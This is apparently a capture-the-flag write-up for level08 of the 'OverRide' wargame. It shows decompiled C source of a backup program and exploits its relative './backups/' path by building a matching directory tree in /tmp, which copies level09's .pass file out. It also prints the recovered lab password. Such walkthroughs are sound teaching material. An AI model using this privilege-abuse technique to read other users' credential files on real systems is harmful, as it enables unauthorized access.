# Level08

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -z execstack -z now source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void log_wrapper(FILE *file, char *str, char *name)
{
    char buffer[264]; // -0x110(%rbp)

    strcpy(buffer, str);
    snprintf(&buffer[strlen(buffer)], 254 - strlen(buffer), name);
    buffer[strcspn(buffer, "\n")] = 0;
    fprintf(file, "LOG: %s\n", buffer);
}

int main(int argc, char **argv)
{
    FILE *log; // -0x88(%rbp)
    FILE *file; // -0x80(%rbp)
    int fd; // -0x78(%rbp)
    char c; // -0x71(%rbp)
    char dest[104]; // -0x70(%rbp)

    c = -1;
    fd = -1;
    if (argc != 2)
        printf("Usage: %s filename\n", *argv);

    log = fopen("./backups/.log", "w");
    if (!log)
    {
        printf("ERROR: Failed to open %s\n", "./backups/.log");
        exit(1);
    }

    log_wrapper(log, "Starting back up: ", argv[1]);

    file = fopen(argv[1], "r");
    if (!file)
    {
        printf("ERROR: Failed to open %s\n", argv[1]);
        exit(1);
    }

    strcpy(dest, "./backups/");
    strncat(dest, argv[1], 99 - strlen(dest));
    fd = open(dest, 193, 432LL);
    if (fd < 0)
    {
        printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
        exit(1);
    }

    while ((c = fgetc(file)) != -1)
        write(fd, &c, 1uLL);

    log_wrapper(log, "Finished back up ", argv[1]);
    fclose(file);
    close(fd);
    return 0;
}
```

In the source code, there isn't any obvious vulnerabilities, we simply have to utilize the utility of the program itself to get the `.pass` file. The program takes a file as an argument, reads it and writes it to a file in the `./backups/` directory. If the path in the `./backups/` directory does not exist, it will not be created and the program will exit with an error, but if the path exists, the program will write the file to it.

If we manage to create a path that contains `/level09/.pass` in the `./backups/` directory, we will be able to write the `.pass` file. Sadly, we don't have the permissions to create a directory in the `./backups/` directory in the home directory. But we can in the `/tmp/` directory! So let's create our folder:
```
level08@OverRide:~$ cd /tmp/
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09
```

Now we can run the program with the path of the `.pass` file as an argument:
```
level08@OverRide:/tmp$ ~/level08 ~level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

We are now level09! Let's move on to the next level.